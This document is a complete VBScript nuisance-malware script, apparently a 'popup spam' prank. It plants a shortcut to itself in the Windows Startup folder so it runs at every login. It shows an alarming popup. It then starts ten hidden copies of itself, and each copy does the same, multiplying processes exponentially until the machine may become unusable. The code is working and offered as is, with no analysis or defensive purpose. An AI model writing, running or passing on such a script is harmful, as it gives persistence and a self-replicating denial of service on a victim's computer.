' Create a Shell object
Set shell = CreateObject("WScript.Shell")

' Define script variables
Dim scriptName, startupFolder, shortcutPath
scriptName = WScript.ScriptFullName
startupFolder = shell.SpecialFolders("Startup") & "\popup_spam_lnk.lnk"
shortcutPath = startupFolder

' Function to create a shortcut in the startup folder
Sub CreateShortcut()
    Dim shortcut
    Set shortcut = shell.CreateShortcut(shortcutPath)
    shortcut.TargetPath = scriptName
    shortcut.WorkingDirectory = shell.CurrentDirectory
    shortcut.WindowStyle = 7 ' Hidden window
    shortcut.Save
End Sub

' Function to display a popup
Sub ShowPopup()
    MsgBox "Warning: This is a spam popup!", vbCritical, "Spam Alert"
End Sub

' Function to start new instances of the script
Sub StartNewInstances()
    Dim i
    For i = 1 To 10 ' Adjust the number as needed
        shell.Run "wscript """ & scriptName & """", 0, False
    Next
End Sub

' Create a shortcut in the startup folder
CreateShortcut()

' Display the popup
ShowPopup()

' Start new instances
StartNewInstances()

' Clean up
Set shell = Nothing
